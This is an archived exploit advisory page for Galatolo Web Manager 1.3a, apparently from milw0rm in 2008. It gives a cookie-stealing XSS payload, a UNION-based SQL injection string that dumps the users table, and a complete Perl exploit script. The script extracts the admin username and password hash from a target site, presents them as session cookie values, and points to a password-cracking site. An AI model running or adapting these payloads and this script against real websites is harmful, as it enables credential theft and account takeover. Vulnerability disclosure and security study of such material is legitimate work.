<html><head><title>Galatolo Web Manager 1.3a <= XSS / Remote SQL Injection Vulnerability</title></head><pre>--==+============================================================================+==--
--==+   Galatolo Web Manager 1.3a &lt;= XSS / Remote SQL Injection Vulnerability    +==--    
--==+============================================================================+==--

 [*] Discovered By: StAkeR ~ StAkeR@hotmail.it
 [+] Discovered On: 14 Jul 2008
 [+] Download: http://gwm.dev-area.org/view.php?id=8

 [*] Vulnerabilities:
 
 [*] XSS &lt;= 1.3a
 [+] all.php?tag= [Code Javascript]
 [+] http://site.com/all.php?tag=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
 
 [*] SQL (plugin users) 1.3a
 [+] plugins/users/index.php?id= [Code SQL]
 [+] -1+union+select+null,concat(user,0x3a,pass),null,concat(user(),0x3a,database(),0x3a,version())+from+users+where+id=1--
 
 [*] Exploit:

 #!/usr/bin/perl 
 use strict;
 use LWP::UserAgent;

 my $host = shift;
 my ($start,$content,@login);
 my $evilxx = &quot;/plugins/users/index.php?id=-1+union+select+1,concat(0x25,user,0x25,pass),null,null+from+users+where+id=1--&quot;;

 if($host =~ /^http:\/\/?/i)
 {
   $start = new LWP::UserAgent or die &quot;[+] Unable to connect\n&quot;;
   $start-&gt;timeout(1);
   $start-&gt;agent(&quot;Mozilla/4.0 (compatible; Lotus-Notes/5.0; Windows-NT)&quot;);
   $content = $start-&gt;get($host.$evilxx);
  
   if($content-&gt;is_success)
   {
     if($content-&gt;content =~ /%(.+?)%([0-9a-f]{32})/)
     {
       push(@login,$1,$2);
       print &quot;[+] Login:\n&quot;;
       print &quot;[+] Username: $login[0]\n&quot;;
       print &quot;[+] Password: $login[1]\n\n&quot;;
      
       print &quot;[+] Cookie Session:\n&quot;;
       print &quot;[+] gwm_user = $login[0]\n&quot;;
       print &quot;[+] gwm_pass = $login[1]\n\n&quot;;
      
       print &quot;[+] Crack Password:\n&quot;;
       print &quot;[+] md5(md5(password)) for crack:\n&quot;; 
       print &quot;[+] http://passcracking.com\n&quot;;
     }
     else
     {
       print &quot;[+] Exploit Failed\n&quot;;
       print &quot;[+] Site Not Vulnerable\n&quot;;
     }
   }
 }
 else
 {
   print &quot;[+] Galatolo Web Manager (plugin users) 1.3 Remote SQL Injection\n&quot;;
   print &quot;[+] Exploit Coded By: StAkeR ~ StAkeR\@hotmail.it\n\n&quot;;
   print &quot;[+] Usage: Perl $0 &lt;host&gt;\n&quot;;
   print &quot;[+] Usage: Perl $0 http://site.com\n&quot;;
 }

# milw0rm.com [2008-07-15]</pre></html>